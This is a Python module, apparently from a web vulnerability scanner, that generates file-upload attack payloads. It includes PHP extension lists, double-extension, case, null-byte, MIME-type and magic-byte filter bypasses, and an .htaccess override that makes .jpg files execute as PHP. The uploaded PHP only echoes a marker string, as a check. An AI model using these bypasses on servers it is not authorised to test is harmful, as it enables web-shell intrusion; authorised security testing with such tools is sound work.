"""
PayloadManager: ファイルアップロード攻撃用のペイロードを生成・管理するモジュール。
"""

import logging
import random
import string
from dataclasses import dataclass
from typing import List, Dict

logger = logging.getLogger(__name__)

@dataclass
class UploadPayload:
    """アップロード用ペイロード情報"""
    filename: str
    content: bytes
    mime_type: str
    technique: str  # e.g., "Direct Upload", "MIME Type Bypass"

class PayloadManager:
    """
    攻撃ペイロードの生成クラス
    """

    # 危険な拡張子 (PHP)
    PHP_EXTENSIONS = [".php", ".php5", ".phtml", ".phar", ".php3", ".php4"]

    # バイパス用ダブル拡張子
    BYPASS_EXTENSIONS = [".php.jpg", ".php.png", ".php.gif"]

    # ケースマニピュレーション (大文字小文字)
    CASE_EXTENSIONS = [".PhP", ".pHp", ".PHP"]

    # ヌルバイト (古い環境用)
    NULL_BYTE_EXTENSIONS = [".php%00.jpg", ".php\0.jpg"]

    # WebShell コード (連結確認用)
    # 演算結果 "SHIGOKU_UPLOAD_SUCCESS" を期待する
    PHP_VERIFY_CODE = '<?php echo "SHIGOKU_" . "UPLOAD_SUCCESS"; ?>'

    # Magic Bytes (JPEG)
    JPEG_MAGIC = b'\xFF\xD8\xFF\xE0'

    def __init__(self):
        pass

    def get_all_payloads(self) -> List[UploadPayload]:
        """全攻撃手法のペイロードリストを生成して返す"""
        payloads = []
        
        # 1. Direct PHP Upload
        for ext in self.PHP_EXTENSIONS:
            payloads.append(UploadPayload(
                filename=f"shigoku_{self._random_id()}{ext}",
                content=self.PHP_VERIFY_CODE.encode(),
                mime_type="application/x-httpd-php",
                technique="Direct PHP Upload"
            ))

        # 2. MIME Type Bypass
        payloads.append(UploadPayload(
            filename=f"shigoku_mime_{self._random_id()}.php",
            content=self.PHP_VERIFY_CODE.encode(),
            mime_type="image/jpeg",
            technique="MIME Type Bypass"
        ))

        # 3. Double Extension
        for ext in self.BYPASS_EXTENSIONS:
            payloads.append(UploadPayload(
                filename=f"shigoku_bp_{self._random_id()}{ext}",
                content=self.PHP_VERIFY_CODE.encode(),
                mime_type="image/jpeg",
                technique="Double Extension Bypass"
            ))

        # 4. Case Manipulation
        for ext in self.CASE_EXTENSIONS:
            payloads.append(UploadPayload(
                filename=f"shigoku_case_{self._random_id()}{ext}",
                content=self.PHP_VERIFY_CODE.encode(),
                mime_type="image/jpeg",
                technique="Case Manipulation Bypass"
            ))

        # 5. Magic Byte Injection (Fake JPEG)
        payloads.append(UploadPayload(
            filename=f"shigoku_magic_{self._random_id()}.php.jpg",
            content=self.JPEG_MAGIC + self.PHP_VERIFY_CODE.encode(),
            mime_type="image/jpeg",
            technique="Magic Byte Injection"
        ))

        return payloads

    def get_htaccess_payload(self) -> UploadPayload:
        """AddType を利用した .htaccess ペイロード"""
        content = (
            "AddType application/x-httpd-php .jpg\n"
            "AddHandler application/x-httpd-php .jpg\n"
        ).encode()
        
        return UploadPayload(
            filename=".htaccess",
            content=content,
            mime_type="text/plain",
            technique=".htaccess Overwrite"
        )

    def get_probe_payload(self) -> UploadPayload:
        """パス特定のための無害な画像ペイロード"""
        return UploadPayload(
            filename=f"probe_{self._random_id()}.jpg",
            content=b"SHIGOKU_PROBE_IMAGE_DATA",
            mime_type="image/jpeg",
            technique="Path Discovery Probe"
        )

    def _random_id(self, length: int = 6) -> str:
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
